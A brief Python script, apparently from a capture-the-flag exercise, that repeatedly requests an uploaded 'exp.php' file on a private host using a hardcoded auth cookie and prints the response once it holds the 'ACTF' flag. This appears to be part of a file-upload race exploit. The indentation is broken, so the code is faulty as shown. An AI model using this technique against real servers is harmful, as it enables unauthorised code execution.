import requests
url = 'http://10.214.10.94/upload_file/exp.php'
headers ={"Cookie":"authtoken=3180103367.4124bb15c1dad3091d08fdab64d5c43d"}
while 1:
    r = requests.get(url,headers=headers)
    if 'ACTF' in  r.text:
    print r.text